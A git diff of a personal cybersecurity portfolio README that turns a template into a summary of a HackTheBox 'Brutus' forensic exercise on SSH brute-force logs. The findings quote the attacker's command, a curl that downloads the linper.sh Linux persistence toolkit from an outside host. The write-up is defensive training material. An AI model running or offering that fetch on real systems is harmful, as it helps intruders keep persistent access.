@@ -1,57 +1,27 @@
-# 🔐 Cybersecurity Projects by [Your Name]  
+# 🔐 Cybersecurity Projects by Cyrus Tabakhi  
 
-Welcome to my cybersecurity portfolio! Here, you'll find a collection of projects that demonstrate my skills in penetration testing, network security, digital forensics, and ethical hacking.  
+Welcome to my cybersecurity portfolio! This repository showcases my **digital forensics, penetration testing, and system security projects**, including **Active Directory security simulations and Unix log analysis**.
+
+---
 
 ## 📌 Featured Projects  
 
-### 🚀 [Project Name]  
+### 🕵️ Brutus – Unix Log Analysis (HackTheBox Sherlocks)  
 **Description:**  
-A brief overview of the project. Explain what it does and why it's important.  
+This project involves **forensic analysis of Unix authentication logs (`auth.log` & `wtmp`)** to investigate a **brute-force attack on an SSH server**. The attacker gained access, escalated privileges, and maintained persistence.  
 
 **🔧 Tools & Technologies Used:**  
-- 🛠️ Tool 1 (e.g., Nmap, Wireshark, Metasploit)  
-- 📡 Tool 2 (e.g., Burp Suite, Hydra, John the Ripper)  
-- 🔐 Tool 3 (e.g., Splunk, Sysmon, Security Onion)  
+- 🐧 **Linux (Ubuntu/Kali)** – Log analysis & CLI-based forensics  
+- 📂 **auth.log & wtmp** – Tracking authentication & session activity  
+- 🛡️ **MITRE ATT&CK Framework** – Identifying persistence techniques  
 
-**🔍 Key Skills:**  
-✅ Skill 1 (e.g., Network Enumeration, Threat Hunting)  
-✅ Skill 2 (e.g., Active Directory Security, OSINT)  
-✅ Skill 3 (e.g., Digital Forensics, Malware Analysis)  
-
-**📂 Project Files & Documentation:**  
-- [📜 Report / Write-up](#)  
-- [📽️ Demo Video (if available)](#)  
-- [📁 Code / Scripts](#)  
-
----
-
-### 🛠 Active Directory Security Simulation  
-**Description:**  
-Engineered an **Active Directory environment** to simulate real-world cybersecurity threats and implement defensive measures.  
-
-**🔧 Tools Used:**  
-- Windows Server 2022  
-- Active Directory Domain Services (ADDS)  
-- Sysmon, Splunk, Universal Forwarder  
-
-**📂 Resources:**  
-- [🔗 Project Repo](#)  
-- [📜 Security Report](#)  
-
----
-
-## 🏆 Certifications & Learning  
-📜 **CompTIA Security+ (Expected: Apr 2025)**  
-📜 **Google IT Support Professional (Nov 2024)**  
-
-## 📬 Connect With Me  
-🔗 **LinkedIn:** [Your LinkedIn](#)  
-💻 **GitHub:** [Your GitHub](#)  
-📧 **Email:** [Your Email](#)  
-
----
-
-### ⚡ How to Use This Repo  
-1. Clone the repository:  
+**🔍 Key Findings:**  
+✅ **Attacker’s IP Address:** `65.2.161.68`  
+✅ **Compromised Account:** `root`  
+✅ **First Login Timestamp:** `2024-03-06 06:32:45`  
+✅ **SSH Session ID:** `37`  
+✅ **Persistence Strategy:** **Created a new privileged user (`cyberjunkie`)**  
+✅ **MITRE ATT&CK Sub-technique:** **T1136.001 (Create Account – Local Account)**  
+✅ **Command Executed by Attacker:**  
    ```bash
-   git clone https://github.com/yourusername/cybersecurity-projects.git
+   /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
